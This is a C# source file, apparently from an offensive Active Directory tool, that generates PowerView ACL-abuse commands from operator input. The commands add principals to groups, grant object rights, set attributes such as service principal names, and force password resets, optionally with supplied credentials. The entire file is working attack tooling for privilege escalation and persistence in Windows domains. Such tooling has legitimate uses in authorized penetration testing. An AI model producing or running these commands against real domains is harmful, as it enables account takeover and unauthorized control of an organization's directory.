using System.Collections.Generic;

namespace AD_Commander.Generators;

// Builds PowerView ACL-abuse commands. Pure text generation only.
// Structure follows Operation / Target / Principal / Parameter (spec section 7).
// Set-DomainUserPassword keeps its dedicated generator (two-password format); the other
// operations are single PowerView one-liners that reuse the shared credential block.
public static class AclGenerator
{
    public static string Generate(
        string operation,
        string target,
        string principal,
        string newPassword,
        string rights,
        string setValue,
        string credDomain,
        string credUsername,
        string credPassword,
        bool secureMode)
    {
        if (operation == "Set-DomainUserPassword")
        {
            return SetDomainUserPasswordGenerator.Generate(
                credDomain, credUsername, target, credPassword, newPassword, secureMode);
        }

        bool useCredential = credDomain.Length > 0 && credUsername.Length > 0;
        List<string> lines = new List<string>();

        if (useCredential)
        {
            lines.AddRange(GeneratorHelpers.CredentialBlock(credDomain, credUsername, credPassword, secureMode));
        }

        lines.Add(GeneratorHelpers.PowerViewImport);
        lines.Add("");

        string command = BuildCommand(operation, target, principal, rights, setValue);
        if (useCredential)
        {
            command += " -Credential $Cred";
        }

        lines.Add(command);

        return string.Join("\r\n", lines);
    }

    private static string BuildCommand(string operation, string target, string principal, string rights, string setValue)
    {
        string t = GeneratorHelpers.EscapeSingleQuotes(target);

        switch (operation)
        {
            case "Add-DomainGroupMember":
                return $"Add-DomainGroupMember -Identity '{t}' -Members '{GeneratorHelpers.EscapeSingleQuotes(principal)}'";

            case "Add-DomainObjectAcl":
                return $"Add-DomainObjectAcl -TargetIdentity '{t}' -PrincipalIdentity '{GeneratorHelpers.EscapeSingleQuotes(principal)}' -Rights {rights}";

            case "Set-DomainObject":
                return $"Set-DomainObject -Identity '{t}' -Set {BuildHashtable(setValue)}";

            default:
                return operation;
        }
    }

    // Turns "attribute=value" into @{'attribute'='value'}. If there is no '=', the value is used
    // as-is, so an operator can paste a full hashtable like @{serviceprincipalname='svc/host'}.
    private static string BuildHashtable(string setValue)
    {
        int eq = setValue.IndexOf('=');
        if (eq < 0)
        {
            return setValue;
        }

        string attr = GeneratorHelpers.EscapeSingleQuotes(setValue.Substring(0, eq).Trim());
        string val = GeneratorHelpers.EscapeSingleQuotes(setValue.Substring(eq + 1).Trim());
        return "@{'" + attr + "'='" + val + "'}";
    }
}
